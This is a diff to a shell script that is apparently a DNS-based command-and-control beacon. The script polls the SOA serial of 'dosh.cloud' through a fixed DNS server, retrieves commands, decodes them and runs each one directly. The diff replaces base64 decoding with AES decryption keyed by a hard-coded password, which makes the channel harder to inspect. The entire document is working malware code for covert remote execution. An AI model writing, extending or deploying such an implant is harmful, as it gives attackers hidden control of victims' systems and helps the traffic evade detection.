@@ -3,6 +3,7 @@
 
 domain="dosh.cloud"
 current=0
+pass="c2FuZHRvbWIK"
 # Pull down commands from server
 pull(){
     # Get number of commands to query for
@@ -18,7 +19,7 @@ pull(){
         # Remove quotations
         cmd=$(echo ${cmd:1:len-2})
         # Decode the command
-        cmd=$(echo $cmd | base64 --decode)
+        cmd=$(echo $cmd | openssl enc -aes-256-cbc -d -a -k $pass)
         $cmd
         let x=x+1
     done
@@ -28,6 +29,8 @@ check(){
     serial=$(dig @129.21.130.212 -t soa +short $domain | awk '{print $3}')
     echo $serial
 }
+
+
 # Main driver for beacon
 main(){
     new=$(check)
